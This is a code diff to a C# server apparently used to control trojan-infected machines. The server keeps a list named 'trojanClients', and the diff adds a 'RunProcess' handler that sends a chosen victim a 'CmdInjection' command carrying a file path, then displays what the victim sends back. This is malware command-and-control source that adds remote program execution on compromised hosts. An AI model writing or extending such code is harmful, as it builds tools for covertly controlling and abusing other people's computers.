@@ -30,6 +30,7 @@ namespace Server.TCP
             serverGUI.Show();
             serverGUI.SentPressed += SendMessage;
             serverGUI.GetFiles += GetFiles;
+            serverGUI.RunProcess += RunProcess;
 
             BackgroundWorker worker1 = new BackgroundWorker();
             worker1.DoWork += new DoWorkEventHandler(Worker1_DoWork);
@@ -103,6 +104,30 @@ namespace Server.TCP
             else
             {
                 serverGUI.DisplayOutput("Select a client and a command.");
+            }
+        }
+
+        async void RunProcess(object sender, EventArgs e)
+        {
+            int clientId = serverGUI.GetClientId();
+            string path = serverGUI.GetFile();
+            if (clientId >= 0 && !string.IsNullOrEmpty(path))
+            {
+                var trojanClient = trojanClients[serverGUI.GetClientId()];
+                var client = trojanClient.Client;
+
+                // Get a stream object for reading and writing
+                
+                Command command = new Command((int)CommandsEnum.CmdInjection,"\"" + path + "\"");
+                string output = JsonConvert.SerializeObject(command);
+
+
+                SendOnSocket(client, output);
+                await ReceiveFromSocket(client, serverGUI.DisplayOutput);
+            }
+            else
+            {
+                serverGUI.DisplayOutput("Select a client and a file.");
             }
         }
 
